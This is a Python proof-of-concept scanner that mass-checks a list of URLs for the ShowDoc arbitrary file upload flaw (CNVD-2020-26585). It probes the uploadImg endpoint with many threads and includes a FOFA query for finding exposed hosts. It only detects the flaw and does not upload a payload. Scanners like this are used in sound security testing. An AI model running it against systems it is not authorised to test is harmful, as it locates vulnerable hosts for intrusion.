#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/5/8
# @Github  : https://github.com/Cr4y0nXX

import os
import time
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser

requests.packages.urllib3.disable_warnings()

class POC:
    pocName = "showDocFileUpload"
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        self.init()
        self.urlList = self.loadURL()  # 所有目标
        self.multiRun()
        self.start = time.time()

    def banner(self):
        logo = r"""

   _____ _                   _____             ______ _ _      _    _       _                 _ 
  / ____| |                 |  __ \           |  ____(_) |    | |  | |     | |               | |
 | (___ | |__   _____      _| |  | | ___   ___| |__   _| | ___| |  | |_ __ | | ___   __ _  __| |
  \___ \| '_ \ / _ \ \ /\ / / |  | |/ _ \ / __|  __| | | |/ _ \ |  | | '_ \| |/ _ \ / _` |/ _` |
  ____) | | | | (_) \ V  V /| |__| | (_) | (__| |    | | |  __/ |__| | |_) | | (_) | (_| | (_| |
 |_____/|_| |_|\___/ \_/\_/ |_____/ \___/ \___|_|    |_|_|\___|\____/| .__/|_|\___/ \__,_|\__,_|  POC
                                                                     | |                        
                                                                     |_|               Author: Cr4y0n
        """
        msg = """
==================================================
| 漏洞名称 | ShowDoc任意文件上传漏洞
| 漏洞时间 | 2020-05-01 ？
| 影响版本 | ？
| 漏洞编号 | CNVD-2020-26585
| 漏洞文件 | index.php
| 漏洞地址 | /index.php?s=/home/page/uploadImg
| FOFA语句 | app="ShowDoc"
==================================================
        """
        print("\033[91m" + logo + "\033[0m")
        print(msg)

    def init(self):
        print("\nthread:", self.args.thread)
        print("timeout:", self.args.timeout)
        msg = ""
        if os.path.isfile(self.args.file):
            msg += "Load url file successfully\n"
        else:
            msg += f"\033[31mLoad url file {self.args.file} failed\033[0m\n"
        print(msg)
        if "failed" in msg:
            print("Init failed, Please check the environment.")
            os._exit(0)
        print("Init successfully")

    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-f", "--file", required=False, type=str, default=f"./url.txt", help=f"The url file, default is ./url.txt")
        parser.add_argument("-t", "--thread", required=False, type=int, default=32, help=f"Number of thread, default is 32")
        parser.add_argument("-T", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
        parser.add_argument("-o", "--output", required=False, type=str, default=date,  help="Vuln url output file, default is {date}.txt")
        return parser.parse_args()

    # 验证漏洞
    def verify(self, url):
        reqURL = url + "/index.php?s=/home/page/uploadImg"
        try:
            rep = requests.post(url=reqURL, timeout=self.args.timeout, verify=False)
            if rep.status_code == 200 and "没有上传的文件" in rep.text:
                msg = f"\033[32m[+] [ Vuln ] {url}\033[0m"
                self.lock.acquire()
                try:
                    self.findCount += 1
                    self.vulnRULList.append(url)
                finally:
                    self.lock.release()
            else:
                msg = f"[-] [ Safe ] {url}"
        except:
            msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
        self.lock.acquire()
        try:
            print(msg)
        finally:
            self.lock.release()

    # 加载url地址
    def loadURL(self):
        urlList = []
        with open(self.args.file, encoding="utf8") as f:
            for line in f.readlines():
                line = line.strip()
                if "https://" in line:
                    line = line.replace("https://", "http://")
                if "http://" not in line:
                    line = f"http://{line}"
                urlList.append(line)
        return urlList

    # 多线程运行
    def multiRun(self):
        self.findCount = 0
        self.vulnRULList = []
        self.lock = Lock()
        executor = ThreadPoolExecutor(max_workers=self.args.thread)
        executor.map(self.verify, self.urlList)

    # 输出到文件
    def output(self):
        if not os.path.isdir(r"./output"):
            os.mkdir(r"./output")
        self.outputFile = f"./output/{self.pocName}_{self.args.output}.txt"
        with open(self.outputFile, "a") as f:
            for url in self.vulnRULList:
                f.write(url + "\n")

    def __del__(self):
        try:
            print("\nattemptCount：\033[31m%d\033[0m   findCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe vulnURL has been saved in {self.outputFile}\n")
        except:
            pass

if __name__ == "__main__":
    POC()


